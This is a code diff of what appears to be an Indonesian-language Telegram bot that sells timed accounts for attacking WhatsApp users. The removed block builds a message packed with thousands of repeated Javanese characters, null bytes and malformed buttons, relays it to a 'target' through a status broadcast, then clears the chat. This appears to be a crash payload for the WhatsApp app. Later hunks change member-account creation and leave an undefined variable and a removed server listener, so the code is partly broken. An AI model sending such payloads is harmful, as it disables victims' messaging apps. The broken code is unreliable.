-        businessOwnerJid: "5521992999999@s.whatsapp.net"
-      },
-      participant: "0@s.whatsapp.net",
-      remoteJid: "status@broadcast",
-      forwardedNewsletterMessageInfo: {
-        newsletterName: "ꦾ".repeat(100),
-        newsletterJid: "120363330344810280@newsletter",
-        serverMessageId: 999
-      },
-      messageAssociation: {
-        associationType: 1,
-        parentMessageKey: album.key
-      }
-    };
-
-    msgj.message.nativeFlowMessage = {
-      buttons: [
-        {
-          type: "call_button",
-          callButton: {
-            displayText: "ꦽ".repeat(1000),
-            phoneNumber: "+5521992999999"
-        }
-      },
-      {
-          type: "url",
-          urlButton: {
-            displayText: "ꦽ".repeat(1000),
-            url: "https://wa.me/+5521992999999?text=" + encodeURIComponent("ꦾ".repeat(1500))
-        }
-      },
-      {
-          type: "unknown_type",
-          weirdButton: {
-            displayText: "ꦽ".repeat(1000),
-            payload: "\u0000".repeat(1000)
-        }
-      },
-    ],
-      content: {
-        namespace: "call_permission_request_namespace",
-        name: "call_permission_request",
-          params: [
-            { 
-              name: "call_type",
-              value: "video" 
-            },
-            { 
-              name: "permission_reason", 
-              value: "\u0000".repeat(1000) 
-            },
-            {
-              name: "support_url", 
-              value: "https://wa.me/+5521992999999" 
-            }
-        ]
-      }
-    };
-
-    await sock.relayMessage("status@broadcast", msgj.message, {
-      messageId: msgj.key.id,
-      statusJidList: [target],
-      additionalNodes: [
-        {
-          tag: "meta",
-          attrs: {},
-          content: [
-            {
-              tag: "mentioned_users",
-              attrs: {},
-              content: [
-                { tag: "to", attrs: { jid: target }, content: undefined }
-              ]
-            }
-          ]
-        }
-      ]
-    });
-    
-try {
-      await sock.chatModify({ clear: true }, target);
-            console.log("KONEKSI");
-        } catch (error) {
-            console.error("GAGAL:", error);
-        }
-        await new Promise(resolve => setTimeout(resolve, 500));
-    }
-  }
-}
 // ======================================= //
 // WhatsApp Connect Logic
 function sleep(ms) {
@@ -2668,9 +2039,16 @@ bot.on("callback_query", async (query) => {
         const [username, password, day] = msg.text.split("|");
         const db = loadDatabase();
         if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
-        const expired = new Date();
-        expired.setDate(expired.getDate() + parseInt(day));
-        db.push({ username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
+const expired = new Date();
+expired.setDate(expired.getDate() + parseInt(day));
+
+db.push({ 
+  username, 
+  password, 
+  role, 
+  expiredDate: expired.toISOString().split("T")[0],
+  androidId: null  // <-- tambahkan ini
+});
         saveDatabase(db);
         bot.sendMessage(id, `✅ Akun member dibuat:
 👤 Username: ${username}
@@ -2717,8 +2095,15 @@ bot.on("callback_query", async (query) => {
         const db = loadDatabase();
         if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
         const expired = new Date();
-        expired.setDate(expired.getDate() + parseInt(day));
-        db.push({ username, password, role, expiredDate: expired.toISOString().split("T")[0] });
+expired.setDate(expired.getDate() + parseInt(day));
+
+db.push({ 
+  username, 
+  password, 
+  role, 
+  expiredDate: expired.toISOString().split("T")[0],
+  androidId: null  // 
+});
         saveDatabase(db);
         bot.sendMessage(id, `✅ Akun ${role} dibuat:
 👤 Username: ${username}`);
@@ -3268,10 +2653,8 @@ bot.onText(/^\/?restart$/, async (msg) => {
   }, 5000);
 });
 // ===== Start Express Server =====
-app.listen(PORT, () => {
-  console.log(`🚀 Server aktif di http://localhost:${PORT}`);
+
     startUserSessions()
-});
 
 // ===== AUTO RESTART PANEL DENGAN STATUS TELEGRAM =====
 const RESTART_INTERVAL = 20 * 60 * 1000; // 20 menit
